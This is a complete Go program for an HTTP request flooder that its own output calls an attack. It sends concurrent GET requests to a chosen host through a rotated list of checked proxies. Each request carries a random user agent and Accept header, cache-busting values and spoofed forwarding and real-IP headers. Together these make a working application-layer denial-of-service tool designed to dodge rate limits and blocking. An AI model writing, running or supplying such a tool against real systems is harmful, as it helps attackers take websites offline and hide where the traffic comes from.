package main

import (
	"bufio"
	"flag"
	"fmt"
	"math"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/corpix/uarand"
	"golang.org/x/net/http2"
)

type Proxy struct {
	IP       string
	Port     string
	Username *string
	Password *string
}

var proxies []Proxy
var host string
var times int
var wait_time int
var proxiesPath string
var headers = []string{
	"*/*",
	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8",
	"application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
	"image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*",
	"text/html, application/xhtml+xml, image/jxr, */*",
	"text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1",
	"application/javascript, */*;q=0.8",
	"text/html, text/plain; q=0.6, */*; q=0.1",
	"application/graphql, application/json; q=0.8, application/xml; q=0.7",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
}

var cache_header = []string{
	"no-cache",
	"max-age=0",
}

func main() {
	rand.Seed(time.Now().UnixNano())
	flag.StringVar(&host, "h", "", "The host name or ip (required)")
	flag.IntVar(&times, "t", 5, "The number of  requests (optional: default 5)")
	flag.IntVar(&wait_time, "w", 1, "The number of wait seconds before seding a new request (optional: default 1)")
	flag.StringVar(&proxiesPath, "p", "", "The path of proxies file (optional)")
	flag.Parse()

	wait_time = int(math.Max(5, float64(wait_time)))

	if host == "" {
		panic("Please enter a valid host using -h flag")
	}

	valid, err := isValidURL(host)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	if !valid {
		panic(fmt.Sprintf("Invalid host: %s", host))
	}

	u, err := url.Parse(host)
	if err != nil {
		fmt.Println("Error parsing host:", err)
		return
	}

	if u.Scheme == "" {
		u.Scheme = "http"
	}
	host = u.String()

	if proxiesPath != "" {
		if _, err := os.Stat(proxiesPath); err == nil {
			fmt.Println("Proxies file exists, Start checking...")

			// Open the file
			file, err := os.Open(proxiesPath)
			if err != nil {
				fmt.Println("Error opening file:", err)
				return
			}
			defer file.Close()

			scanner := bufio.NewScanner(file)
			var wg sync.WaitGroup
			proxyChan := make(chan Proxy, 10)

			go func() {
				for scanner.Scan() {
					line := strings.TrimSpace(scanner.Text())
					if line != "" {
						proxy, err := parseProxy(line)
						if err != nil {
							fmt.Println("Error parsing proxy:", err)
							continue
						}
						wg.Add(1)
						go func(p Proxy) {
							defer wg.Done()
							if checkProxy(p) {
								proxyChan <- p
							}
						}(proxy)
					}
				}
				wg.Wait()
				close(proxyChan)
			}()

			for proxy := range proxyChan {
				proxies = append(proxies, proxy)
			}

			if err := scanner.Err(); err != nil {
				fmt.Println("Error reading file:", err)
				return
			}
		} else if os.IsNotExist(err) {
			fmt.Printf("Proxies path doesn't exist: %s\n", proxiesPath)
		} else {
			fmt.Println("Error checking file:", err)
		}
	} else {
		fmt.Println("No proxies file path provided. Skipping file check.")
	}

	fmt.Printf("\n\nHost: %s\nProxies: %d\nRequest Count: %d\nWait time: %d\n\n ~ Attack Started\n\n", host, len(proxies), times, wait_time)

	var wg sync.WaitGroup
	for i := 1; i <= times; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			status := "FAILED"
			if sendGetRequest() {
				status = "DONE"
			}
			fmt.Printf("Request number %d ~ Status: %s\n", i, status)
			time.Sleep(time.Duration(wait_time) * time.Second)
		}(i)
	}

	wg.Wait()
	fmt.Println("\nAll the requests have been sent!")
}

func parseProxy(line string) (Proxy, error) {
	parts := strings.Split(line, ":")
	switch len(parts) {
	case 2:
		return Proxy{IP: parts[0], Port: parts[1], Username: nil, Password: nil}, nil
	case 4:
		username := parts[2]
		password := parts[3]
		return Proxy{IP: parts[0], Port: parts[1], Username: &username, Password: &password}, nil
	default:
		return Proxy{}, fmt.Errorf("invalid proxy format: %s", line)
	}
}

func sendGetRequest() bool {
	handler := func(client *http.Client) bool {
		err := http2.ConfigureTransport(client.Transport.(*http.Transport))
		if err != nil {
			fmt.Println("Error configuring HTTP/2 transport:", err)
			return false
		}

		req, err := http.NewRequest("GET", host, nil)
		if err != nil {
			fmt.Println("Error creating request:", err)
			return false
		}

		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
		req.Header.Set("Accept", headers[rand.Intn(len(headers))])
		req.Header.Set("cache-control", cache_header[rand.Intn(len(cache_header))])
		req.Header.Set("user-agent", uarand.GetRandom())
		req.Header.Set("upgrade-insecure-requests", "1")
		req.Header.Set("x-forwarded-for", host)
		req.Header.Set("x-forwarded-host", host)
		req.Header.Set("x-forwarded-proto", "https")
		req.Header.Set("x-real-ip", host)
		req.Header.Set("x-real-port", "443")
		req.Header.Set("x-forwarded-port", "443")
		req.Header.Set("x-forwarded-server", host)
		req.Header.Set("x-original-uri", host)

		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error sending request:", err)
			return false
		}
		defer resp.Body.Close()
		return resp.StatusCode == http.StatusOK
	}

	if len(proxies) > 0 {
		proxy := proxies[rand.Intn(len(proxies))]

		proxyURL := &url.URL{
			Scheme: "http",
			Host:   fmt.Sprintf("%s:%s", proxy.IP, proxy.Port),
		}

		if proxy.Username != nil && proxy.Password != nil {
			proxyURL.User = url.UserPassword(*proxy.Username, *proxy.Password)
		}

		client := &http.Client{
			Transport: &http.Transport{
				Proxy: http.ProxyURL(proxyURL),
			},
		}

		return handler(client)
	}

	client := &http.Client{}
	return handler(client)
}

func isValidURL(host string) (bool, error) {
	u, err := url.Parse(host)
	if err != nil {
		return false, err
	}

	if u.Scheme != "" && u.Scheme != "http" && u.Scheme != "https" {
		return false, nil // Unsupported scheme
	}

	if u.Host == "" {
		ip := net.ParseIP(host)
		if ip == nil {
			return false, nil
		}

		return true, nil
	}

	if strings.Contains(u.Host, ":") {
		hostParts := strings.Split(u.Host, ":")
		hostWithoutPort := hostParts[0]
		ip := net.ParseIP(hostWithoutPort)
		if ip == nil {
			return false, nil
		}
		return true, nil
	}

	if u.Hostname() != "" {
		return true, nil
	}

	return false, nil
}

func checkProxy(proxy Proxy) bool {
	proxyURL := &url.URL{
		Host: fmt.Sprintf("%s:%s", proxy.IP, proxy.Port),
	}

	if proxy.Username != nil && proxy.Password != nil {
		proxyURL.Scheme = "http"
		proxyURL.User = url.UserPassword(*proxy.Username, *proxy.Password)
	} else {
		proxyURL.Scheme = "http"
	}

	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
		Timeout: 5 * time.Second,
	}

	req, err := http.NewRequest("GET", "https://www.google.com", nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return false
	}

	resp, err := client.Do(req)
	if err != nil {
		// fmt.Println("Error making request:", err)
		return false
	}
	defer resp.Body.Close()

	return resp.StatusCode == http.StatusOK
}
